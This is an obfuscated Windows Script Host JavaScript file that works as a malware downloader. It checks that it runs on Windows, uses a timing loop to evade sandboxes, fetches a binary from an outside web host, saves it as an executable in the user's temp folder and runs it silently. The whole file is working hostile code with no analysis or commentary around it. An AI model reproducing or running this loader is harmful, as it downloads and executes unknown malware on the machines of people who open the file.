var qN = false;
var V = "CreateObject";
var Bm = function H() {return WScript[V]("WScript.Shell");}(), Yk = 11;
var f0 = "MSXML2.XMLHTTP";
var e = 2123213;
var K = 0;
function q(VQ){Bm["Run"](VQ, K, K);};
function sG(){return "" + f0;};
function j(Fn, e0){K = K * 1; return Fn - e0;};
function X(){return V;};
/*@cc_on
  @if (@_win32 || @_win64)
    qN = true;
  @end
@*/
if (qN)
{
var U = "";
function C(){return 22;};
var R = 0; var p = 0;
function wJ()
{
var d = new this["Date"]();
var t = d["getUTCMilliseconds"]();
WScript["Sleep"](C());
var d = new this["Date"]();
var LM = d["getUTCMilliseconds"]();
WScript["Sleep"](C());
var d = new this["Date"]();
var yj = d["getUTCMilliseconds"]();
var R = "Dn";
R = j(LM, t);
var p = "C0";
p = j(yj, LM);
U = "open";
return j(R, p);
}
var N0 = false;
var yt = false;
for (var N = K; N < C() * 1; N++){if (wJ() != K){
N0 = true; 
p = "31" + 11 * R + p; 
yt = true; 
break;
}}
function S() {return ((N0 == true) && (N0 == yt)) ? 1 : K;};
if (N0 && S() && yt){
function rD() {return Bm["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "QwnHXDVEtCUVL.exe";};
 T = sG();
 Hx = WScript[V](T);
 var m = 1;
 while (m){
try {
Hx[U]("GET", "http://shippedmedicalsupplies.com/n5ids", false);
Hx["send"]();
t0 = "Sleep";
for (;;){WScript[t0](C() * 11); if (Hx["readystate"] >= 2 * 2) break;};
m = K;
} catch(pf){};
}
function gV(BC) {var f = (1, 2, 3, 4, 5, BC); return f;};
R0 = WScript[X()]("ADODB.Stream");
T = R0;
T[U]();
T["type"] = gV(1);
T["write"](Hx["ResponseBody"]);
R0["position"] = gV(K);
T["Save" + "ToFile"](rD(), 2);
R0["c"+"lose"]();
QW = rD();
q(QW);
}
}

